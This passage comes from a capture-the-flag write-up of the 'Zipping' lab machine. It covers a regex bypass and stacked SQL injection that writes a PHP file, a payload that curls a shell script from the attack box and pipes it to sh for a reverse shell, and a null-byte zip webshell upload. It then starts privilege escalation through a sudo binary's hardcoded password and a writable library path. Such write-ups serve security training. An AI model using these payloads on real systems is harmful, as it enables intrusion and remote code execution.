+</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Fetch the product from the database and return the result as an Array
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$product</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Check if the product exists (array is not empty)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$product</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Simple error to display if the id for the product doesn&#39;t exists (array is empty)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Product does not exist!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Simple error to display if the id wasn&#39;t specified
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;No ID provided!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">---snip---
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;form action=&#34;index.php?page=cart&#34; method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">---snip---
+</span></span></span></code></pre></div><p>The <code>preg_match()</code> function is utilized to filter the contents of the <code>id</code> parameter, but it only ensures that the payload ends with a number without much other filtering.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]</span><span class="se">\\</span><span class="s2">|;:&#39;</span><span class="se">\&#34;</span><span class="s2">,.&lt;&gt;\/?]|[^0-9]$/&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>I can <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#new-line-bypass" target="_blank" rel="noreferrer">bypass the regex check using a new line</a> (<code>%0A</code>) in the payload.
+This can be confirmed by setting the id parameter to <code>%0A2</code>, which loads the same product as when the id parameter is set to 2.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/bypass-preg-match-regex.png" alt="bypass-preg-match-regex" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Verify preg_match() bypass</figcaption>
+</figure>
+</p>
+<p>Furthermore, given that PDO is used for preparing SQL queries, it&rsquo;s worth noting that PDO <a href="https://blog.ulf-wendel.de/2008/pdo_mysqlnd-insecure-multi-statements-and-pdostatementnextrowset/" target="_blank" rel="noreferrer">permits consecutive multiple queries</a> separated by a new line.</p>
+<p>A payload like this (URL-encoded new line followed by a SQL query to write to a file) should successfully bypass the regex check and write code to execute <code>phpinfo()</code> at the specified location using mysql&rsquo;s <code>SELECT...INTO OUTFILE</code>. It&rsquo;s interesting that the <code>/tmp</code> directory didn&rsquo;t work for writing, but <code>/dev/shm</code> functions as expected for some reason.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%0A<span class="s1">&#39;;select &#39;</span>&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;<span class="s1">&#39; into outfile &#39;</span>/dev/shm/poc.php<span class="err">&#39;</span> <span class="c1">#2</span>
+</span></span></code></pre></div><p>This can be verified by using the PHP inclusion functionality at <code>/shop/index.php?page=</code>.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/sqli-rce-poc.png" alt="sqli-rce-poc" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">SQLi to Code execution PoC</figcaption>
+</figure>
+</p>
+<p>Now, with the ability to execute code, I use URL-encoded version of this payload to fetch a script containing a reverse shell payload from my attack box and execute it, ultimately obtaining a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%0A<span class="s1">&#39;;select &#39;</span>&lt;?php system<span class="o">(</span><span class="s2">&#34;curl http://10.10.14.42/shell_payload.sh | sh&#34;</span><span class="o">)</span><span class="p">;</span>?&gt;<span class="s1">&#39; into outfile &#39;</span>/dev/shm/shell.php<span class="err">&#39;</span> <span class="c1">#2</span>
+</span></span></code></pre></div><!-- ![sli-to-rce](./images/sli-to-rce.png "SQLi file write to RCE") -->
+<p>The process involves invoking the file at <code>/dev/shm/shell.php</code>, which retrieves the hosted <code>shell_payload.sh</code> file from my attack box and executes it, giving a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http zipping.htb/shop/index.php <span class="nv">page</span><span class="o">==</span>/dev/shm/shell
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; pc -lp <span class="m">9005</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:32:21<span class="o">]</span> Welcome to pwncat 🐈!                                                                    __main__.py:164
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:48:29<span class="o">]</span> received connection from 10.129.66.225:45182                                                  bind.py:84
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:48:30<span class="o">]</span> 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash                               manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:48:31<span class="o">]</span> 10.129.66.225:45182: registered new host w/ db                                            manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>rektsu<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>rektsu<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>rektsu<span class="o">)</span>
+</span></span></code></pre></div><h2 id="unintended-foothold-patched" class="relative group">Unintended Foothold (Patched) <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#unintended-foothold-patched" aria-label="Anchor">#</a></span></h2><h3 id="null-byte-injection" class="relative group">Null Byte Injection <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#null-byte-injection" aria-label="Anchor">#</a></span></h3><p>I decided to fetch the source code of the upload functionality to analyze it. Given that the application provides a link to view the decompressed file, uploading a PHP file within the archive could potentially allow the execution of malicious code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Get the uploaded zip file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$zipFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;zipFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;zipFile&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">300000</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Create an md5 hash of the zip file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$fileHash</span> <span class="o">=</span> <span class="nx">md5_file</span><span class="p">(</span><span class="nv">$zipFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Create a new directory for the extracted files
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$uploadDir</span> <span class="o">=</span> <span class="s2">&#34;uploads/</span><span class="si">$fileHash</span><span class="s2">/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Extract the files from the zip
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$zipFile</span><span class="p">)</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">count</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s1">&#39;&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Get the name of the compressed file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$fileName</span> <span class="o">=</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">getNameIndex</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">)</span> <span class="o">===</span> <span class="s2">&#34;pdf&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$uploadDir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;7z e &#39;</span><span class="o">.</span><span class="nv">$zipFile</span><span class="o">.</span> <span class="s1">&#39; -o&#39;</span> <span class="o">.</span><span class="nv">$uploadDir</span><span class="o">.</span> <span class="s1">&#39;&gt;/dev/null&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&#34;&#39;</span><span class="o">.</span><span class="nv">$uploadDir</span><span class="o">.</span><span class="nv">$fileName</span><span class="o">.</span><span class="s1">&#39;&#34;&gt;&#39;</span><span class="o">.</span><span class="nv">$uploadDir</span><span class="o">.</span><span class="nv">$fileName</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/p&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;The unzipped file must have  a .pdf extension.&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;Error uploading file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>The code checks if the archive contains a PDF file using the <code>pathinfo()</code> function which can be bypassed using a <a href="https://www.thehacker.recipes/web/inputs/null-byte-injection" target="_blank" rel="noreferrer">null byte</a> (\x00).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="s2">&#34;shell.php%00.pdf&#34;</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PHP</span> <span class="nx">Parse</span> <span class="nx">error</span><span class="o">:</span>  <span class="nx">syntax</span> <span class="nx">error</span><span class="p">,</span> <span class="nx">unexpected</span> <span class="nx">token</span> <span class="s2">&#34;echo&#34;</span><span class="p">,</span> <span class="nx">expecting</span> <span class="s2">&#34;,&#34;</span> <span class="k">or</span> <span class="s2">&#34;;&#34;</span> <span class="nx">in</span> <span class="nx">php</span> <span class="nx">shell</span> <span class="nx">code</span> <span class="nx">on</span> <span class="nx">line</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="s2">&#34;shell.php</span><span class="se">\x00</span><span class="s2">.pdf&#34;</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pdf</span>
+</span></span></code></pre></div><p>To add in a null byte, I used the char <code>#</code> as a place holder and then replaced it using iamhex.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; zip rce.zip webshell.php<span class="se">\#</span>.pdf
+</span></span><span class="line"><span class="cl">&gt; strings rce.zip
+</span></span><span class="line"><span class="cl">webshell.php#.pdfUT
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">webshell.php#.pdfUT
+</span></span><span class="line"><span class="cl">&gt; imhex rce.zip <span class="p">&amp;</span>
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/imhex-add-null-byte.png" alt="imhex-add-null-byte" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Add null bytes using imhex</figcaption>
+</figure>
+</p>
+<p>Now when I run strings on the file, the # is replaced</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; strings rce.zip
+</span></span><span class="line"><span class="cl">webshell.php
+</span></span><span class="line"><span class="cl">.pdfUT
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">webshell.php
+</span></span><span class="line"><span class="cl">.pdfUT
+</span></span></code></pre></div><p>Upon uploading the malicious archive, the application returns a link to view the decompressed file, which, in reality, acts as a webshell payload.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/upload-php-webshell.png" alt="upload-php-webshell" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Upload PHP Webshell</figcaption>
+</figure>
+</p>
+<p>navigating to <code>/upload/&lt;md5sum&gt;/webshell.php</code> gives a shell as <code>rektsu</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; pc -lp <span class="m">9005</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:32:21<span class="o">]</span> Welcome to pwncat 🐈!                                                                    __main__.py:164
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:48:29<span class="o">]</span> received connection from 10.129.66.225:45182                                                  bind.py:84
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:48:30<span class="o">]</span> 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash                               manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:48:31<span class="o">]</span> 10.129.66.225:45182: registered new host w/ db                                            manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>rektsu<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>rektsu<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>rektsu<span class="o">)</span>
+</span></span></code></pre></div><p><strong><em>This vulnerability was patched a few weeks after the box was release</em></strong></p>
+<hr>
+<h2 id="privilege-escalation" class="relative group">Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation" aria-label="Anchor">#</a></span></h2><hr>
+<p>The user <code>rektsu</code> has sudo privileges to execute the <code>/usr/bin/stock</code> binary as the root user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/home/rektsu$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> rektsu on zipping:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User rektsu may run the following commands on zipping:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/stock
+</span></span></code></pre></div><p>Unfortunately, the binary requires a password to proceed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/home/rektsu$ stock
+</span></span><span class="line"><span class="cl">Enter the password: <span class="m">123</span>
+</span></span><span class="line"><span class="cl">Invalid password, please try again.
+</span></span></code></pre></div><p>Executing the <code>strings</code> command on the binary reveals two potential passwords and makes reference to a CSV file in the root directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/home/rektsu$ strings /usr/bin/stock
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hakaize
+</span></span><span class="line"><span class="cl">St0ckM4nager
+</span></span><span class="line"><span class="cl">/root/.stock.csv
+</span></span><span class="line"><span class="cl">Enter the password:
+</span></span><span class="line"><span class="cl">Invalid password, please try again.
+</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="nv">Menu</span> <span class="o">==================</span>
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> See the stock
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Edit the stock
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Exit the program
+</span></span><span class="line"><span class="cl">Select an option:
+</span></span><span class="line"><span class="cl">You <span class="k">do</span> not have permissions to <span class="nb">read</span> the file
+</span></span><span class="line"><span class="cl">File could not be opened.
+</span></span><span class="line"><span class="cl"><span class="o">==================</span> Stock <span class="nv">Actual</span> <span class="o">==================</span>
+</span></span><span class="line"><span class="cl">Colour     Black   Gold    Silver
+</span></span><span class="line"><span class="cl">Amount     %-7d %-7d %-7d
+</span></span><span class="line"><span class="cl">Quality   Excelent Average Poor
+</span></span><span class="line"><span class="cl">Amount    %-9d %-7d %-4d
+</span></span><span class="line"><span class="cl">Exclusive Yes    No
+</span></span><span class="line"><span class="cl">Amount    %-4d   %-4d
+</span></span><span class="line"><span class="cl">Warranty  Yes    <span class="nv">No</span>
+</span></span><span class="line"><span class="cl"><span class="o">==================</span> Edit <span class="nv">Stock</span> <span class="o">==================</span>
+</span></span><span class="line"><span class="cl">Enter the information of the watch you wish to update:
+</span></span><span class="line"><span class="cl">Colour <span class="o">(</span>0: black, 1: gold, 2: silver<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">Quality <span class="o">(</span>0: excelent, 1: average, 2: poor<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">Exclusivity <span class="o">(</span>0: yes, 1: no<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">Warranty <span class="o">(</span>0: yes, 1: no<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">Amount:
+</span></span><span class="line"><span class="cl">Error: The information entered is incorrect
+</span></span><span class="line"><span class="cl">%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
+</span></span><span class="line"><span class="cl">The stock has been updated correctly.
+</span></span></code></pre></div><h3 id="investigating-binary" class="relative group">Investigating binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#investigating-binary" aria-label="Anchor">#</a></span></h3><p>To further analyze the binary, I downloaded it locally as the box lacked the <code>ltrace</code> tool. It&rsquo;s evident that the entered password is compared to the string <code>St0ckM4nager</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ltrace ./stock
+</span></span><span class="line"><span class="cl">printf<span class="o">(</span><span class="s2">&#34;Enter the password: &#34;</span><span class="o">)</span>                                        <span class="o">=</span> <span class="m">20</span>
+</span></span><span class="line"><span class="cl">fgets<span class="o">(</span>Enter the password: <span class="m">123</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;123\n&#34;</span>, 30, 0x7f1f74709aa0<span class="o">)</span>                                    <span class="o">=</span> 0x7ffd232c0f00
+</span></span><span class="line"><span class="cl">strchr<span class="o">(</span><span class="s2">&#34;123\n&#34;</span>, <span class="s1">&#39;\n&#39;</span><span class="o">)</span>                                                 <span class="o">=</span> <span class="s2">&#34;\n&#34;</span>
+</span></span><span class="line"><span class="cl">strcmp<span class="o">(</span><span class="s2">&#34;123&#34;</span>, <span class="s2">&#34;St0ckM4nager&#34;</span><span class="o">)</span>                                         <span class="o">=</span> -34
+</span></span><span class="line"><span class="cl">puts<span class="o">(</span><span class="s2">&#34;Invalid password, please try aga&#34;</span>...Invalid password, please try again.
+</span></span><span class="line"><span class="cl"><span class="o">)</span>                           <span class="o">=</span> <span class="m">36</span>
+</span></span><span class="line"><span class="cl">+++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</span></span></code></pre></div><p>After rerunning <code>ltrace</code> with the correct password, I noticed that a shared library gets loaded. What caught my attention is that this library is stored at <code>/home/rektsu/.config/libcounter.so</code>, a location accessible to me as the user rektsu.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ltrace -s <span class="m">50</span> ./stock
+</span></span><span class="line"><span class="cl">printf<span class="o">(</span><span class="s2">&#34;Enter the password: &#34;</span><span class="o">)</span>                                                                                       <span class="o">=</span> <span class="m">20</span>
+</span></span><span class="line"><span class="cl">fgets<span class="o">(</span>Enter the password: St0ckM4nager
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;St0ckM4nager\n&#34;</span>, 30, 0x7f713dc51aa0<span class="o">)</span>                                                                          <span class="o">=</span> 0x7ffdd7b61f90
+</span></span><span class="line"><span class="cl">strchr<span class="o">(</span><span class="s2">&#34;St0ckM4nager\n&#34;</span>, <span class="s1">&#39;\n&#39;</span><span class="o">)</span>                                                                                       <span class="o">=</span> <span class="s2">&#34;\n&#34;</span>
+</span></span><span class="line"><span class="cl">strcmp<span class="o">(</span><span class="s2">&#34;St0ckM4nager&#34;</span>, <span class="s2">&#34;St0ckM4nager&#34;</span><span class="o">)</span>                                                                               <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">dlopen<span class="o">(</span><span class="s2">&#34;/home/rektsu/.config/libcounter.so&#34;</span>, 1<span class="o">)</span>                                                                      <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">puts<span class="o">(</span><span class="s2">&#34;\n================== Menu ==================\n&#34;</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>Unfortunately, <code>strace</code> doesn&rsquo;t give any new information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">write<span class="o">(</span>1, <span class="s2">&#34;Enter the password: &#34;</span>, 20Enter the password: <span class="o">)</span>    <span class="o">=</span> <span class="m">20</span>
+</span></span><span class="line"><span class="cl">read<span class="o">(</span>0, St0ckM4nager
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;St0ckM4nager\n&#34;</span>, 1024<span class="o">)</span>         <span class="o">=</span> <span class="m">13</span>
+</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/rektsu/.config/libcounter.so&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
+</span></span></code></pre></div><h3 id="disassembly-with-gdb-alternative" class="relative group">Disassembly with gdb (Alternative) <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#disassembly-with-gdb-alternative" aria-label="Anchor">#</a></span></h3><p>I can also use gdb to disassemble the binary and inbvstigate it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ gdb ./stock
+</span></span><span class="line"><span class="cl">GNU gdb <span class="o">(</span>Debian 13.2-1<span class="o">)</span> 13.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Reading symbols from ./stock...
+</span></span><span class="line"><span class="cl"><span class="o">(</span>No debugging symbols found in ./stock<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> disassemble main
+</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
+</span></span><span class="line"><span class="cl">   0x00000000000012ba &lt;+0&gt;: push   %rbp
+</span></span><span class="line"><span class="cl">   0x00000000000012bb &lt;+1&gt;: mov    %rsp,%rbp
+</span></span><span class="line"><span class="cl">   0x00000000000012be &lt;+4&gt;: sub    <span class="nv">$0</span>x100,%rsp
+</span></span><span class="line"><span class="cl">&lt;---snip---&gt;
+</span></span><span class="line"><span class="cl">   0x00000000000013db &lt;+289&gt;:  mov    %rax,%rdi
+</span></span><span class="line"><span class="cl">   0x00000000000013de &lt;+292&gt;:  call   0x10b0 &lt;dlopen@plt&gt;
+</span></span><span class="line"><span class="cl">   0x00000000000013e3 &lt;+297&gt;:  mov    %rax,-0x20<span class="o">(</span>%rbp<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt;---snip---&gt;
+</span></span></code></pre></div><p>The <a href="https://unix.stackexchange.com/questions/611730/does-dlopen-performs-dynamic-linking-by-invoking-dynamic-linker-ld-linux-so" target="_blank" rel="noreferrer">dltopen()</a> call was interesting, it is supposed to load a library dynamically and store the return value. Ideally, <code>rax</code> is supposed to store the return value and <code>rdi</code> is typically the first argument passed to a function call. This means <code>rdi</code> would contain the first argument for the dynamic linking i.e. the library.</p>
+<p>To investigate this, I set a breakpoint at the dltopen() call, and run the binary again.
+<code>b *main +292</code> sets a breakpoint on main at an offset of 292.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> b *main +292
